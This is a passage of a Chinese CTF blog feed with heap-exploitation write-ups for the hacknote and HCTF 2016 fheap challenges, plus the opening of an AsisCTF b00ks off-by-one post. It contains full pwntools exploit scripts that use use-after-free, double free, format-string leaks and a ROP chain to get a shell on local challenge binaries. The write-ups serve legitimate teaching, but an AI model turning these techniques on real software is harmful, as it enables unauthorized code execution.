class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure><p>我们先</p><p>addnote(16, b”aaaa”) # add note 0<br>addnote(16, b”ddaa”) # add note 1</p><p>第一次malloc</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p><p>第二次</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p><p>依次malloc，堆的是这样的</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p><p>我们去free</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p><h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong>机制是在<strong>libc-2.26</strong>中引入，小于0x400的堆，<strong>FILO</strong>(先进后出)的单循环链表、精确分配(不切割)、<strong>free</strong>后为防止合并后一个堆块的<strong>inuse</strong>位不置<strong>0</strong>，大小低于<strong>0x400</strong>字节的堆块时会首先放入<strong>Tcachebin</strong>，每个bins最多存放7个chunk，malloc在申请大小低于<strong>0x400</strong>的堆块时</p><p>再次申请</p><p>addnote(8, p32(magic))</p><p>这里都需要0x10大小的chunk，刚好有两个</p><p>这样我们修改note3的context内容也就修改了note1的put指针</p><p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p><p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h2><p><a href="https://github.com/zh-explorer/hctf2016-fheap">https://github.com/zh-explorer/hctf2016-fheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; ./pwn-f </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">So, let&#x27;s crash the world</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">1.create string</span><br><span class="line">2.delete string</span><br><span class="line">3.quit</span><br><span class="line">^C⏎                                                                                                                                             grxer@grxer ~/D/c/p/heap [SIGINT]&gt; checksec pwn-f </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/pwn-f&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>功能很简单，再create时会malloc一个结构体，string长度&gt;0xf会再次申请一块内存,&lt;直接存在了结构体里，直接推测出结构体大致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *buf;</span><br><span class="line">        <span class="type">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="comment">//这里会填充8字节以满足结构体对齐规则 </span></span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>存在一个结构体数组的全局变量在0x2020C0来存储chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>]; 大小为<span class="number">16</span>字节</span><br></pre></td></tr></table></figure><p>删除时只是简单free没有null 产生dangling pointer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0x11</span> )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD *)&amp;struct_at</span><br><span class="line">                                                                                        + <span class="number">2</span> * (<span class="type">int</span>)v1</span><br><span class="line">                                                                                        + <span class="number">1</span>));</span><br><span class="line">    *((_DWORD *)&amp;struct_at + <span class="number">4</span> * (<span class="type">int</span>)v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create(10,’hello’)<br>create(0x20,’grxer666666666666666666666666666’)</p><img src="/2023/03/04/Using-After-Free/image-20230307152831940.png" alt="image-20230307152831940" style="zoom:67%;"><h3 id="using-after-free"><a href="#using-after-free" class="headerlink" title="using after free"></a>using after free</h3><p>我们先creat 两个string ，这样共申请了2个0x32大小的chunk，再先释放1再释放0会进入tcache bins</p><p><code>tchche bin    string0------&gt;string1</code></p><p>这时候我们在申请一块小于0x28大小的chunk(空间复用会导致比原来可以多8个字节，也就是chunk head的prev size)</p><p>这样我们的结构体会分到string0地址，context会分到string 1地址，string1地址里的free函数还在里面，而且还在全局结构数组里，可以控制该指针为任意函数</p><p>这样我们下次再delete(0)可以把两个chunk再次释放</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D6C</span><span class="params">(<span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次申请就又可以和之前一样，再次delete（1）循环利用</p><p><img src="/2023/03/04/Using-After-Free/image-20230307163539833.png" alt="image-20230307163539833"></p><h4 id="覆盖为call-puts，泄露pie基址"><a href="#覆盖为call-puts，泄露pie基址" class="headerlink" title="覆盖为call puts，泄露pie基址"></a>覆盖为call puts，泄露pie基址</h4><p>payload&#x3D;b’a’*24+b’\x1a’<br>create(len(payload),payload)</p><h4 id="覆盖为printf，利用格式化字符串漏洞"><a href="#覆盖为printf，利用格式化字符串漏洞" class="headerlink" title="覆盖为printf，利用格式化字符串漏洞"></a>覆盖为printf，利用格式化字符串漏洞</h4><p>利用pie基址，泄露libc即可</p><p>payload&#x3D;b’a’*4+b’%15$p’.ljust(20,b’b’)+p64(printf_plt)<br>create(len(payload),payload)<br>delete(1)<br>ru(b’a’*4)<br>_IO_file_write&#x3D;int(r(14),16)-45<br>p(‘_IO_file_write’,_IO_file_write)</p><h4 id="覆盖为system"><a href="#覆盖为system" class="headerlink" title="覆盖为system"></a>覆盖为system</h4><p>拿到shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230307174939515.png" alt="image-20230307174939515"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_2_1_stdout_=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">base=_IO_2_1_stdout_-libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;sh;&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;1&#x27;</span>)+p64(system)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面这种方法不知道为什么在高版本glibc下拿不到shell，这里我们再delete是发现会在栈上输入，这样我也可以构造rop链来拿到shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230308005837886.png" alt="image-20230308005837886"></p><p>我们需要输入yes占8个字节绕过strncmp，然后四个pop到后面ret的地址，进行rop</p><p><img src="/2023/03/04/Using-After-Free/image-20230308011254973.png" alt="image-20230308011254973"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%15$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_file_write=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">45</span></span><br><span class="line">p(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">base=_IO_file_write-libc.dump(<span class="string">&#x27;_IO_file_write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pop4=pie+<span class="number">0x00000000000011dc</span></span><br><span class="line">rdi=<span class="number">0x00000000000011e3</span>+pie</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop4)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;delete\nid:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload= <span class="string">b&quot;yesaaaaa&quot;</span> + p64(rdi) + p64(bin_sh) + p64(<span class="number">0x949</span>+pie)+p64(system)</span><br><span class="line">sla(<span class="string">&quot;sure?:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>我们还可以利用都变了free来做free函数调用hook</p><p>如果我们先申请两个string chunk</p><p>create(5,b’hello’)<br>create(5,b’grxer’)</p><p>再释放</p><p>delete(0)<br>delete(1)<br>delete(0)</p><p>这样我们的fastbin会在0和1直接有一个回环链表</p><p><img src="/2023/03/04/Using-After-Free/image-20230308124636807.png" alt="image-20230308124636807"></p><p>我们再次</p><p>create(4, b’fsf’)<br>create(0x20, b’a’ * 0x16 + b’lo’ + b’\x2d\x00’)</p><p>第一个create会申请到第一个string堆块，第二个creat会申请到第二个string堆块，和第一个string堆块作为context存储区，而我们的第一个creat会把该块当作自己的struct，这样就可以控制它的free指针，改写为puts指针输出puts地址，找到基址</p><p><img src="/2023/03/04/Using-After-Free/image-20230308125210074.png" alt="image-20230308125210074"></p><p>我们再次delete(1),再次申请一个context大于0xf&lt;&#x3D;0x28的chunk即可循环利用</p><h4 id="exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"><a href="#exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以" class="headerlink" title="exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"></a>exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&#x27;fsf&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Using After Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFF-BY-ONE AsisCTF2016b00ks</title>
      <link href="/2023/03/02/AsisCTF2016b00ks-OBO/"/>
      <url>/2023/03/02/AsisCTF2016b00ks-OBO/</url>
      
        <content type="html"><![CDATA[<h1 id="AsisCTF-2016-b00ks-OFF-BY-ONE"><a href="#AsisCTF-2016-b00ks-OFF-BY-ONE" class="headerlink" title="AsisCTF-2016-b00ks OFF-BY-ONE"></a>AsisCTF-2016-b00ks OFF-BY-ONE</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p><p>__free_hook and off by one</p><span id="more"></span><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302015134670.png" alt="image-20230302015134670"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012924030.png" alt="image-20230302012924030"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302010143341.png" alt="image-20230302010143341"></p><p>有漏洞会多读取一个字节的&#x2F;x00</p><p>author name存放在unk_202040+pie处，32个字节</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302011350558.png" alt="image-20230302011350558"></p><p>分析后可以推断出book结构体是如下的，而且在unk_202060+pie处开始存放结构体指针，我们可以进行一个字节的溢出，来控制book1的最低位地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span 